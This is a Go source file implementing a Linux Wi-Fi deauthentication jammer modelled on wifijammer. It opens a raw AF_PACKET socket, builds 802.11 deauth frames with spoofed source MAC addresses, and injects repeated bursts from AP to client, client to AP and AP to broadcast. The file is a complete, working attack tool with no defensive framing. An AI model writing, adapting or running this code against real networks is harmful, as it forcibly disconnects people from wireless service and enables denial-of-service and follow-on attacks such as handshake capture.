//go:build linux

package deauth

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// Config holds deauth sender parameters.
type Config struct {
	Iface         string
	Packets       int           // bursts per target
	Interval      time.Duration // sleep between each send
	SkipBroadcast bool          // skip AP→broadcast packet
	SkipMAC       net.HardwareAddr
}

// Sender crafts and injects 802.11 deauth frames via a raw AF_PACKET socket.
// This approach mirrors wifijammer (Scapy) exactly: bare Dot11 frames with
// no RadioTap header, sent through a raw AF_PACKET socket — the same kernel
// injection path that makes wifijammer work where pcap WritePacketData fails.
type Sender struct {
	cfg     Config
	fd      int
	ifindex int
}

// New creates a Sender and opens a raw AF_PACKET socket for injection.
func New(cfg Config) (*Sender, error) {
	iface, err := net.InterfaceByName(cfg.Iface)
	if err != nil {
		return nil, fmt.Errorf("interface %q: %w", cfg.Iface, err)
	}
	// AF_PACKET SOCK_RAW with ETH_P_ALL — identical to what Scapy uses.
	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	if err != nil {
		return nil, fmt.Errorf("open raw socket: %w", err)
	}
	return &Sender{cfg: cfg, fd: fd, ifindex: iface.Index}, nil
}

// Close releases the raw socket.
func (s *Sender) Close() {
	if s.fd >= 0 {
		unix.Close(s.fd)
		s.fd = -1
	}
}

// Deauth sends the 3-packet deauth burst for a given AP→Client pair.
// Returns the number of packets actually sent.
func (s *Sender) Deauth(apMAC, clientMAC net.HardwareAddr) int {
	if s.shouldSkip(apMAC) || s.shouldSkip(clientMAC) {
		return 0
	}

	sent := 0
	for i := 0; i < s.cfg.Packets; i++ {
		// Packet 1: AP → Client (addr1=client, addr2=ap, addr3=ap)
		// Mirrors: Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
		if err := s.inject(buildDot11Deauth(clientMAC, apMAC, apMAC)); err == nil {
			sent++
		}
		s.sleep()

		// Packet 2: Client → AP (addr1=ap, addr2=client, addr3=client)
		// Mirrors: Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
		if err := s.inject(buildDot11Deauth(apMAC, clientMAC, clientMAC)); err == nil {
			sent++
		}
		s.sleep()

		// Packet 3: AP → Broadcast
		if !s.cfg.SkipBroadcast {
			if err := s.inject(buildDot11Deauth(broadcastMAC, apMAC, apMAC)); err == nil {
				sent++
			}
			s.sleep()
		}
	}
	return sent
}

func (s *Sender) inject(frame []byte) error {
	sa := &unix.SockaddrLinklayer{
		Protocol: htons(unix.ETH_P_ALL),
		Ifindex:  s.ifindex,
	}
	return unix.Sendto(s.fd, frame, 0, sa)
}

func (s *Sender) sleep() {
	if s.cfg.Interval > 0 {
		time.Sleep(s.cfg.Interval)
	}
}

func (s *Sender) shouldSkip(mac net.HardwareAddr) bool {
	return len(s.cfg.SkipMAC) == 6 && bytes.Equal(s.cfg.SkipMAC, mac)
}

// buildDot11Deauth builds a raw 802.11 management deauth frame with NO RadioTap
// header — exactly what Scapy's Dot11(addr1=...,addr2=...,addr3=...)/Dot11Deauth()
// produces. Injected via AF_PACKET, the kernel's mac80211 layer transmits it.
//
// Frame layout (26 bytes):
//
//	[0]     0xC0 — Frame Control byte 0: subtype=deauth(12), type=mgmt(0)
//	[1]     0x00 — Frame Control byte 1: no flags
//	[2-3]   Duration: 314 µs (little-endian)
//	[4-9]   addr1 = destination
//	[10-15] addr2 = source (spoofed)
//	[16-21] addr3 = BSSID
//	[22-23] Sequence Control: 0
//	[24-25] Reason Code: 7 (Class 3 frame from non-associated STA)
func buildDot11Deauth(dst, src, bssid net.HardwareAddr) []byte {
	frame := make([]byte, 26)
	frame[0] = 0xC0
	frame[1] = 0x00
	binary.LittleEndian.PutUint16(frame[2:4], 314)
	copy(frame[4:10], dst)
	copy(frame[10:16], src)
	copy(frame[16:22], bssid)
	binary.LittleEndian.PutUint16(frame[22:24], 0)
	binary.LittleEndian.PutUint16(frame[24:26], 7)
	return frame
}

// htons converts a uint16 to network byte order (big-endian), as needed by
// AF_PACKET socket fields.
func htons(i uint16) uint16 {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, i)
	return *(*uint16)(unsafe.Pointer(&b[0]))
}
